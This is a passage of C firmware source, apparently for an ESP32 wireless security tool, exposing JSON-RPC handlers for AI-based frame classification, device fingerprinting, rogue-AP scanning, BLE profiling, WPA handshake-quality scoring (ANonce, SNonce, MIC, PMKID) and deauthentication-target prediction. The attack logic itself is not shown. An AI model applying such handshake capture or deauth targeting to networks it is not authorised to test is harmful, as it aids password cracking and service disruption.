    cJSON *pref = cJSON_GetObjectItem(root, "pref");
    if (pref == NULL) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing pref", out, out_sz);
    }

    const char *pref_str = cJSON_GetStringValue(pref);
    coex_pref_t p = COEX_PREF_BALANCE;
    if (pref_str && strcmp(pref_str, "wifi") == 0) p = COEX_PREF_WIFI;
    else if (pref_str && strcmp(pref_str, "ble") == 0) p = COEX_PREF_BLE;
    else if (pref_str && strcmp(pref_str, "balance") == 0) p = COEX_PREF_BALANCE;
    else {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "pref must be wifi|ble|balance", out, out_sz);
    }

    esp_err_t rc = coex_set_preference(p);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "coex_set_preference failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_coex_get_status(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = coex_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "coex status failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_coex_json(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = coex_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "coex json failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_load(const char *method, const char *params_json,
                             char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_model_zoo_load(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "ai_model_zoo_load failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"loaded\"", out, out_sz);
}

static esp_err_t rpc_ai_unload(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_model_zoo_unload(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK && rc != ESP_ERR_NOT_FOUND) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "ai_model_zoo_unload failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"unloaded\"", out, out_sz);
}

static esp_err_t rpc_ai_infer(const char *method, const char *params_json,
                              char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    cJSON *input = cJSON_GetObjectItem(root, "input");
    if (name == NULL || !cJSON_IsString(name) ||
        input == NULL || !cJSON_IsString(input)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name or input", out, out_sz);
    }

    const char *input_str = cJSON_GetStringValue(input);
    size_t input_len = strlen(input_str);
    uint8_t output[256];
    size_t out_len = 0;

    esp_err_t rc = ai_model_zoo_infer(cJSON_GetStringValue(name),
                                      input_str, input_len,
                                      output, sizeof(output), &out_len);
    cJSON_Delete(root);
    if (rc == ESP_ERR_NOT_SUPPORTED) {
        cJSON *r = cJSON_CreateObject();
        cJSON_AddStringToObject(r, "status", "stub");
        cJSON_AddStringToObject(r, "note", "link ESP-DL to enable inference");
        const char *json = cJSON_PrintUnformatted(r);
        esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
        cJSON_free((void *)json);
        cJSON_Delete(r);
        return r2;
    }
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "inference failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_ai_list(const char *method, const char *params_json,
                             char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[512];
    esp_err_t rc = ai_model_zoo_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "ai list failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_classify_test(const char *method, const char *params_json,
                                      char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *frame_hex = cJSON_GetObjectItem(root, "frame");
    if (frame_hex == NULL || !cJSON_IsString(frame_hex)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing frame hex", out, out_sz);
    }

    const char *hex = cJSON_GetStringValue(frame_hex);
    size_t hex_len = strlen(hex);
    uint8_t frame[AI_CLASSIFIER_INPUT_MAX];
    size_t frame_len = 0;
    for (size_t i = 0; i < hex_len && frame_len < sizeof(frame); i += 2) {
        unsigned int byte = 0;
        if (sscanf(hex + i, "%02x", &byte) == 1) {
            frame[frame_len++] = (uint8_t)byte;
        }
    }

    ai_classify_result_t res;
    esp_err_t rc = ai_classifier_predict(frame, frame_len, &res);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "classify failed", out, out_sz);
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddStringToObject(r, "class", ai_classifier_class_name(res.cls));
    cJSON_AddNumberToObject(r, "confidence", res.confidence);
    cJSON_AddNumberToObject(r, "inference_us", res.inference_us);
    cJSON_AddBoolToObject(r, "model_loaded", res.model_loaded);

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    return r2;
}

static esp_err_t rpc_ai_classify_stats(const char *method, const char *params_json,
                                       char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_classifier_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "classify stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_classify_set_model(const char *method, const char *params_json,
                                           char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_classifier_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_anomaly_set_model(const char *method, const char *params_json,
                                           char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_anomaly_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_ai_anomaly_set_threshold(const char *method, const char *params_json,
                                              char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *th = cJSON_GetObjectItem(root, "threshold");
    if (th == NULL || !cJSON_IsNumber(th)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing threshold", out, out_sz);
    }

    esp_err_t rc = ai_anomaly_set_threshold((float)cJSON_GetNumberValue(th));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_threshold failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_ai_anomaly_stats(const char *method, const char *params_json,
                                      char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_anomaly_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "anomaly stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_fp_set_model(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_fingerprint_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_ai_fp_stats(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_fingerprint_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "fp stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_fp_test(const char *method, const char *params_json,
                                char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *ie_hex = cJSON_GetObjectItem(root, "ie");
    cJSON *subtype_item = cJSON_GetObjectItem(root, "subtype");
    cJSON *oui_item = cJSON_GetObjectItem(root, "oui");
    if (ie_hex == NULL || !cJSON_IsString(ie_hex) ||
        subtype_item == NULL || !cJSON_IsNumber(subtype_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing ie or subtype", out, out_sz);
    }

    const char *ie_str = cJSON_GetStringValue(ie_hex);
    size_t ie_hex_len = strlen(ie_str);
    uint8_t ie_buf[256];
    size_t ie_len = 0;
    for (size_t i = 0; i < ie_hex_len && ie_len < sizeof(ie_buf); i += 2) {
        unsigned int byte = 0;
        if (sscanf(ie_str + i, "%02x", &byte) == 1) {
            ie_buf[ie_len++] = (uint8_t)byte;
        }
    }

    uint8_t oui[3] = {0};
    if (oui_item && cJSON_IsArray(oui_item)) {
        int cnt = cJSON_GetArraySize(oui_item);
        for (int i = 0; i < 3 && i < cnt; i++) {
            cJSON *item = cJSON_GetArrayItem(oui_item, i);
            if (cJSON_IsNumber(item)) oui[i] = (uint8_t)cJSON_GetNumberValue(item);
        }
    }

    ai_fp_result_t res;
    esp_err_t rc = ai_fingerprint_classify(ie_buf, ie_len,
                                           (uint8_t)cJSON_GetNumberValue(subtype_item),
                                           oui, &res);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "classify failed", out, out_sz);
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddStringToObject(r, "class", ai_fingerprint_class_name(res.cls));
    cJSON_AddStringToObject(r, "label", res.label);
    cJSON_AddNumberToObject(r, "inference_us", res.inference_us);
    cJSON_AddBoolToObject(r, "model_loaded", res.model_loaded);

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    return r2;
}

/*============================================================================*/
static esp_err_t rpc_ai_channel_predict(const char *method, const char *params_json,
                                        char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    ai_channel_predict_t pred;
    esp_err_t rc = ai_channel_predictor_predict(&pred);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "predict failed", out, out_sz);
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddNumberToObject(r, "channel", pred.best_channel);
    cJSON_AddNumberToObject(r, "confidence", pred.confidence);
    cJSON_AddNumberToObject(r, "history", pred.history_count);
    cJSON_AddBoolToObject(r, "model_loaded", pred.model_loaded);
    cJSON_AddNumberToObject(r, "inference_us", pred.inference_us);

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    return r2;
}

static esp_err_t rpc_ai_channel_stats(const char *method, const char *params_json,
                                      char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_channel_predictor_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "channel stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_channel_record(const char *method, const char *params_json,
                                       char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = ai_channel_predictor_record();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "record failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"recorded\"", out, out_sz);
}

static esp_err_t rpc_ai_channel_set_model(const char *method, const char *params_json,
                                          char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_channel_predictor_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_hs_score(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    ai_hs_quality_t q;
    esp_err_t rc = ai_hs_quality_score(&q);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "score failed", out, out_sz);
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddNumberToObject(r, "score", q.score);
    cJSON_AddNumberToObject(r, "factors", q.factors);
    cJSON_AddNumberToObject(r, "m1", q.m1_count);
    cJSON_AddNumberToObject(r, "m2", q.m2_count);
    cJSON_AddNumberToObject(r, "rssi", q.rssi);
    cJSON_AddBoolToObject(r, "complete", q.complete);
    cJSON_AddBoolToObject(r, "anonce", q.has_anonce);
    cJSON_AddBoolToObject(r, "snonce", q.has_snonce);
    cJSON_AddBoolToObject(r, "mic", q.has_mic);
    cJSON_AddBoolToObject(r, "pmkid", q.has_pmkid);

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    return r2;
}

static esp_err_t rpc_ai_hs_stats(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_hs_quality_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "hs stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_hs_set_model(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_hs_quality_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_ai_hs_test(const char *method, const char *params_json,
                                char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *score_val = cJSON_GetObjectItem(root, "score");
    if (score_val == NULL || !cJSON_IsNumber(score_val)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing score", out, out_sz);
    }

    ai_hs_quality_t q;
    memset(&q, 0, sizeof(q));
    q.score = (float)cJSON_GetNumberValue(score_val);
    if (q.score > 1.0f) q.score = 1.0f;
    if (q.score < 0.0f) q.score = 0.0f;

    cJSON *r = cJSON_CreateObject();
    cJSON_AddNumberToObject(r, "score", q.score);
    cJSON_AddStringToObject(r, "verdict",
        q.score > 0.7f ? "high" :
        q.score > 0.4f ? "medium" : "low");

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    cJSON_Delete(root);
    return r2;
}

/*============================================================================*/
static esp_err_t rpc_ai_rogue_scan(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = ai_rogue_detector_scan();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "rogue scan failed", out, out_sz);
    }
    char buf[512];
    rc = ai_rogue_detector_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "rogue json failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_rogue_alerts(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[512];
    esp_err_t rc = ai_rogue_detector_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "rogue alerts failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_deauth_predict(const char *method, const char *params_json,
                                       char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *idx_item = cJSON_GetObjectItem(root, "idx");
    if (idx_item == NULL || !cJSON_IsNumber(idx_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing idx", out, out_sz);
    }

    uint8_t idx = (uint8_t)cJSON_GetNumberValue(idx_item);
    ai_deauth_prediction_t pred;
    esp_err_t rc = ai_deauth_predictor_predict(idx, &pred);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "predict failed", out, out_sz);
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddNumberToObject(r, "idx", pred.target_index);
    cJSON_AddNumberToObject(r, "probability", pred.probability);
    cJSON_AddNumberToObject(r, "flags", pred.flags);
    cJSON_AddBoolToObject(r, "model_loaded", pred.model_loaded);
    cJSON_AddNumberToObject(r, "inference_us", pred.inference_us);

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    return r2;
}

static esp_err_t rpc_ai_deauth_predict_all(const char *method, const char *params_json,
                                           char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = ai_deauth_predictor_predict_all();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "predict_all failed", out, out_sz);
    }
    char buf[512];
    rc = ai_deauth_predictor_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "json failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_deauth_stats(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_deauth_predictor_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "deauth stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_deauth_set_model(const char *method, const char *params_json,
                                         char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_deauth_predictor_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ai_ble_classify(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *mac_item = cJSON_GetObjectItem(root, "mac");
    cJSON *adv_item = cJSON_GetObjectItem(root, "adv");
    if (mac_item == NULL || !cJSON_IsString(mac_item) ||
        adv_item == NULL || !cJSON_IsString(adv_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing mac or adv", out, out_sz);
    }

    const char *mac_str = cJSON_GetStringValue(mac_item);
    const char *adv_str = cJSON_GetStringValue(adv_item);

    uint8_t mac[6] = {0};
    for (int i = 0; i < 6 && mac_str[i*2] && mac_str[i*2+1]; i++) {
        unsigned int byte = 0;
        sscanf(mac_str + i*2, "%02x", &byte);
        mac[i] = (uint8_t)byte;
    }

    size_t adv_hex_len = strlen(adv_str);
    uint8_t adv_buf[256];
    size_t adv_len = 0;
    for (size_t i = 0; i < adv_hex_len && adv_len < sizeof(adv_buf); i += 2) {
        unsigned int byte = 0;
        if (sscanf(adv_str + i, "%02x", &byte) == 1) {
            adv_buf[adv_len++] = (uint8_t)byte;
        }
    }

    ble_info_t ble_info = {0};
    memcpy(ble_info.mac, mac, 6);
    ai_ble_profile_t profile;
    esp_err_t rc = ai_ble_profiler_classify(&ble_info, adv_buf, adv_len, &profile);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "classify failed", out, out_sz);
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddStringToObject(r, "class", ai_ble_profiler_class_name(profile.cls));
    cJSON_AddStringToObject(r, "label", profile.label);
    cJSON_AddNumberToObject(r, "inference_us", profile.inference_us);
    cJSON_AddBoolToObject(r, "model_loaded", profile.model_loaded);

    const char *json = cJSON_PrintUnformatted(r);
    esp_err_t r2 = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(r);
    return r2;
}

static esp_err_t rpc_ai_ble_stats(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_ble_profiler_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "ble stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_ble_set_model(const char *method, const char *params_json,
                                      char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *name = cJSON_GetObjectItem(root, "name");
    if (name == NULL || !cJSON_IsString(name)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing name", out, out_sz);
    }

    esp_err_t rc = ai_ble_profiler_set_model(cJSON_GetStringValue(name));
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "set_model failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

/*============================================================================*/
